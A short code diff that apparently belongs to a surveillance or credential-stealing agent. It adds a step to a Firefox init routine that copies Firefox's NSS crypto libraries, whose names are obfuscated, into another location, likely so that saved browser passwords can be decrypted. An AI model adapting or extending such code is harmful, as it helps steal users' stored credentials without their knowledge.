@@ -339,6 +339,12 @@ void FireFoxInitFunc()
 	swprintf_s(loadPath, MAX_PATH, L"%s\\%S", firefoxDir, DeobStringA(NSSDBM_LIBRARY_NAME));
 	HM_CompletePath(DeobStringA(NSSDBM_LIBRARY_NAME), destPath);
 	CopyDLL(loadPath, destPath);
+
+	if (!libsof) {
+		swprintf_s(loadPath, MAX_PATH, L"%s\\%S", firefoxDir, DeobStringA(SOFTN_LIBRARY_NAME));
+		HM_CompletePath(DeobStringA(SOFTN_LIBRARY_NAME), destPath);
+		CopyDLL(loadPath, destPath);
+	}
 }
 
 void FireFoxUnInitFunc()
